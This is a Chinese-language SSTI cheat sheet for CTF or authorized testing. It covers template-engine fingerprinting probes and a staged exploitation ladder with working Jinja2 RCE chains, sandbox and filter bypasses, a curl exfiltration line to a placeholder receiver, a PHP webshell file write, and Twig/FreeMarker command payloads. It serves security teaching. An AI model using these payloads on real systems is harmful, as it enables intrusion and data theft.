模板注入的本质是**用户输入被当作模板代码解析**，而不是作为数据传入。先确定引擎，再按该引擎的语法找对象链；不同引擎的 payload 不能混用。

> 只对本地题目或授权环境测试；验证从算术表达式开始，不要一上来就打命令。

## 00 30 秒速查

| 探测 | 结果 | 引擎 |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2/Twig |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | 49 | Twig |
| `${7*7}` | 49 | FreeMarker/EL |
| `#{7*7}` | 49 | Ruby/Thymeleaf |
| `{7*7}` | 49 | Smarty |
| `<%= 7*7 %>` | 49 | ERB |
| `{{config}}` | 配置 | Flask |
| `{{7*7}}` 原样 | 只当文本 | 找二次渲染 |

## 01 原理与成立条件

```text
用户输入 → 模板源码 → 引擎解析
                        ├─ 表达式求值
                        ├─ 属性/下标/过滤器
                        └─ 函数/模块 → 文件/命令
```

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 输入进模板源码 | 拼接/字符串模板 | 数据绑定 |
| 引擎求值 | 语法匹配 | 换语法/找二次渲染 |
| 对象可达 | 全局/子类 | 换链 |
| 能到 sink | 文件/命令 | 只算表达式 |

## 02 判断与分型

```text
{{7*7}} 被求值？
 ├─ 是 → 试 {{7*'7'}}
 │    ├─ 7777777 → Jinja2
 │    └─ 49 → Twig
 ├─ 否 → 试 ${7*7}/#{7*7}/{7*7}
 └─ 都原样 → 可能不是 SSTI/找二次渲染
再确认沙箱/过滤：
 ├─ 报属性错误 → 沙箱
 └─ 关键字被删 → 绕过
```

| 信号 | 含义 | 下一步 |
|---|---|---|
| 49 回显 | 表达式执行 | 对象链 |
| `config` 可读 | Flask/Jinja2 | 读密钥 |
| `__class__` 报错 | 沙箱 | 换属性/过滤器 |
| `7*'7'` 区分 | Jinja2/Twig | 选 payload |
| 报错带模板名 | 引擎/路径 | 记版本 |

| 假阳性 | 原因 | 处理 |
|---|---|---|
| 前端算出 49 | JS | 看服务端响应 |
| `{{}}` 原样 | 数据绑定 | 找拼接 |
| 报错无执行 | 语法错 | 修表达式 |
| 沙箱拦截 | 属性过滤 | 换链 |

## 03 利用阶梯

### L0 探测与引擎识别

**前提**：有可疑的回显/模板点。

**步骤**：
1. 发 `{{7*7}}`、`${7*7}`、`#{7*7}`、`{7*7}`。
2. 对 `{{}}` 再发 `{{7*'7'}}` 区分 Jinja2/Twig。
3. 看依赖/报错确认版本。
4. 排除前端计算。

**成功标志**：确定引擎与表达式执行。

**失败分支**：全原样→找二次渲染/换入口；报错→看语法。

### L1 Jinja2 对象链

**前提**：确认 Jinja2/Flask。

**步骤**：
1. `{{config}}` 看 `SECRET_KEY`/数据库。
2. `{{''.__class__.__mro__[1].__subclasses__()}}` 列子类。
3. 找 `_io.FileIO`/`subprocess.Popen`/`os._wrap_close`。
4. 用 `cycler`/`lipsum`/`url_for` 的 `__globals__` 走捷径。

**成功标志**：读到配置/对象列表。

**失败分支**：沙箱→L3；无 globals→L2。

### L2 到文件/命令

**前提**：能访问函数/模块。

**步骤**：
1. `{{cycler.__init__.__globals__.os.popen('id').read()}}`。
2. `{{lipsum.__globals__['os'].popen('id').read()}}`。
3. 读文件：`open('/flag').read()`。
4. 只验证固定回显/只读文件。

**成功标志**：命令输出/文件内容。

**失败分支**：`os` 被拦→子类/其他函数；无回显→L4。

### L3 过滤与沙箱绕过

**前提**：关键字/属性/引号被过滤。

**步骤**：
1. `_`：`\x5f`、`attr('__class__')`。
2. `.`：`[]`、`|attr`。
3. 引号：`request.args.x`。
4. 关键字：拼接/`|join`/`dict(o=1)`。
5. `{{`：`{%print(7*7)%}`、`{%set%}`。

**成功标志**：过滤条件下仍执行。

**失败分支**：沙箱版本已修→换对象；全拦→盲 SSTI。

### L4 盲 SSTI 与其他引擎

**前提**：无回显，或不是 Jinja2。

**步骤**：
1. 时间盲：`os.popen('sleep 5')` 看响应时间。
2. 外带：`curl http://<接收端>/?x=$(id)`。
3. 写文件：`open('/var/www/html/x.php','w').write(...)`。
4. Twig：`{{['id']|map('system')|join}}`（版本相关）。
5. Smarty：`{php}`/静态方法（版本相关）。
6. FreeMarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。

**成功标志**：延时/外带/文件/命令。

**失败分支**：沙箱严格→转其他漏洞；引擎不支持→换链。

## 04 绕过与边界

| 过滤 | 绕过 | 示例 |
|---|---|---|
| `_` | `\x5f`/`attr` | `|attr('__class__')` |
| `.` | `[]`/`|attr` | `['__class__']` |
| `[]` | `__getitem__` | `|attr('__getitem__')` |
| 引号 | `request.args` | 外部传参 |
| `os` | 拼接/join | `['o','s']|join` |
| `{{` | `{%print%}`/`{%set%}` | 语句块 |
| 长度 | 短链 | `lipsum`/`cycler` |

边界：子类索引随环境变化；Flask 全局不一定都有；Twig 3.x/Smarty 新版默认更严；能算数字不等于能执行命令。

## 05 非典型入口

| 位置 | 示例 | 注意 |
|---|---|---|
| 昵称/签名 | 存储型 | 二次渲染 |
| 邮件模板 | 用户可编辑 | 服务端渲染 |
| 页面片段 | CMS | 模板文件 |
| 错误页 | 参数回显 | 反射 |
| 主题/语言 | 上传模板 | 包含 |
| PDF/报表 | 模板引擎 | 服务端 |

## 06 差异速查

| 引擎 | 探测 | 链 |
|---|---|---|
| Jinja2 | `{{7*'7'}}`→`7777777` | `cycler.__init__.__globals__` |
| Twig | `{{7*'7'}}`→49 | `_self.env`/`map('system')` |
| Smarty | `{7*7}` | `{php}`/静态方法 |
| FreeMarker | `${7*7}` | `Execute`/`?new()` |
| Velocity | `$x`/`#set` | 见 Java 页 |
| Thymeleaf | `th:*`/`${}` | 视图名/EL |

## 09 失败分支

| 现象 | 优先怀疑 | 处理 |
|---|---|---|
| 原样输出 | 数据绑定 | 找拼接 |
| 49 但无对象 | 沙箱 | 换属性 |
| `config` 空 | 非 Flask | 走子类 |
| 子类索引错 | 环境差异 | 动态查找 |
| 命令无回显 | 通道 | 时间/外带 |
| Twig 报错 | 版本/沙箱 | 换 payload |
| 过滤严格 | 关键字 | 拼接/attr |
